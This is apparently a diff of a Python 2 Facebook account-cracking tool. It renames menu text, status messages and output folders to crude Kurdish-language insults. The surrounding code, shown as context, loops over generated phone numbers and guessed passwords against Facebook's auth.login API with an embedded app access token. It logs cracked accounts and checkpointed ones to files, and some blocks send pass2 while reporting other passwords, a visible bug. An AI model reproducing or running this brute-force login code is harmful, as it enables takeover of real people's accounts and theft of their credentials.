@@ -70,7 +70,7 @@ def menu():
     os.system('clear')
     print logo
     print 42 * '\x1b[1;91m='
-    print '\x1b[1;94m[1]\x1b[1;92m KURDISTAN CRACK NUMBERS] '
+    print '\x1b[1;94m[1]\x1b[1;92m DaYk GaYN IRaQY] '
     print 42 * '\x1b[1;91m='
     action()
 
@@ -103,18 +103,18 @@ def action():
         print '[!] Fill Ba Kalk Naya'
         action()
     xxx = str(len(id))
-    psb('[\xe2\x9c\x93] Hamw Raqamakan: ' + xxx)
+    psb('[\xe2\x9c\x93]Aw RaQaMaNaY DaYkYaN AGeYN: ' + xxx)
     time.sleep(0.1)
-    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Tkaya Chawarwan Ba ...')
+    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m PaLa Pal MaKa 7iz...')
     time.sleep(0.1)
-    psb('[!] Bo Wastan Dni Toolaka CTRL+Z')
+    psb('[!] BO DaM KuT KRDNi TooLaKa CTRL+Z')
     time.sleep(0.5)
     print 42 * '\x1b[1;91m='
 
     def main(arg):
         user = arg
         try:
-            os.mkdir('save')
+            os.mkdir('DaYK Gayrawakan')
         except OSError:
             pass
 
@@ -123,14 +123,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[HACKED By A7A]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;92m[DaYkY GaYrA By Jala]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
+                okb = open('DaYk Gayrawakan/DaYk Gayraw Finish.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[Checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;91m[Xushki bgem checkpointa]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
+                cps = open('DaYk Gayrawakan/Xushk 7iza checka.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
@@ -139,14 +139,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[HACKED By A7A]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;92m[DaYkY GaYrA By Jala]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
+                okb = open('DaYk Gayrawakan/DaYk Gayraw Finish.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass2 + '\n')
                 okb.close()
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;91m[Xushki bgem checkpointa]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
+                cps = open('DaYk Gayrawakan/Xushk 7iza checka.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass2 + '\n')
                 cps.close()
                 cpb.append(c + user + pass2)
@@ -155,14 +155,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[HACKED By A7A]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;92m[DaYkY GaYrA By Jala]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
+                okb = open('DaYk Gayrawakan/DaYk Gayraw Finish.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass3 + '\n')
                 okb.close()
                 oks.append(c + user + pass3)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;91m[Xushki bgem checkpointa]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
+                cps = open('DaYk Gayrawakan/Xushk 7iza checka.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass3 + '\n')
                 cps.close()
                 cpb.append(c + user + pass3) 
@@ -171,14 +171,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[HACKED By A7A]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;92m[DaYkY GaYrA By Jala]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
+                okb = open('DaYk Gayrawakan/DaYk Gayraw Finish.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass4 + '\n')
                 okb.close()
                 oks.append(c + user + pass4)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;91m[Xushki bgem checkpointa]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
+                cps = open('DaYk Gayrawakan/Xushk 7iza checka.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass4 + '\n')
                 cps.close()
                 cpb.append(c + user + pass4)
@@ -187,14 +187,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[HACKED By A7A]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
-                okb = open('save/successfull.txt', 'a')
+                print '\x1b[1;92m[DaYkY GaYrA By Jala]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
+                okb = open('DaYk Gayrawakan/DaYk Gayraw Finish.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass5 + '\n')
                 okb.close()
                 oks.append(c + user + pass5)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass5 + '\n'
-                cps = open('save/checkpoint.txt', 'a')
+                print '\x1b[1;91m[Xushki bgem checkpointa]\x1b[1;91m ' + k + c + user + ' >>> ' + pass5 + '\n'
+                cps = open('DaYk Gayrawakan/Xushk 7iza checka.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass5 + '\n')
                 cps.close()
                 cpb.append(c + user + pass5) 
